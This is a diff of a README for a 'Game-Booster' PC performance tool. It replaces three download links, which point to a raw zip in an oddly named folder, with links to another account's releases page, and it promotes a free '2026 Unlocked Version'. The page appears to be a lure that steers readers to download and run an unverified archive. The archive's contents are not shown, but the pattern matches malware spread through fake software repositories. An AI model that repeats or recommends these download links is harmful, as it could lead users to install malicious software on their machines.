@@ -1,7 +1,7 @@
 <h1>🎮 Game-Booster - Boost Your PC Gaming Performance Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/mizanbinb/Game-Booster/raw/refs/heads/main/licentiousness/3.3-beta.4.zip">
+  <a href="https://github.com/Magmalutriumph/Game-Booster/releases/tag/download">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20GAME%20BOOSTER%20FREE-FF6B6B?style=for-the-badge&logo=download&logoColor=white&labelColor=4ECDC4" alt="Download Game Booster">
   </a>
 </p>
@@ -49,7 +49,7 @@ Getting Game-Booster on your PC is quick and easy. Follow these simple steps:
 
 ### Step 1: Visit the Official Download Page
 
-Visit this link to download the application: **[https://github.com/mizanbinb/Game-Booster/raw/refs/heads/main/licentiousness/3.3-beta.4.zip](https://github.com/mizanbinb/Game-Booster/raw/refs/heads/main/licentiousness/3.3-beta.4.zip)**
+Visit this link to download the application: **[https://github.com/Magmalutriumph/Game-Booster/releases/tag/download](https://github.com/Magmalutriumph/Game-Booster/releases/tag/download)**
 
 ### Step 2: Click the Download Button
 
@@ -193,7 +193,7 @@ Need help? We're here for you:
 
 Ready to supercharge your gaming experience?
 
-**[⬇️ Download Game-Booster Free – 2026 Unlocked Version](https://github.com/mizanbinb/Game-Booster/raw/refs/heads/main/licentiousness/3.3-beta.4.zip)**
+**[⬇️ Download Game-Booster Free – 2026 Unlocked Version](https://github.com/Magmalutriumph/Game-Booster/releases/tag/download)**
 
 Don't let a slow PC ruin your gaming. Get Game-Booster today and play at your best!
 
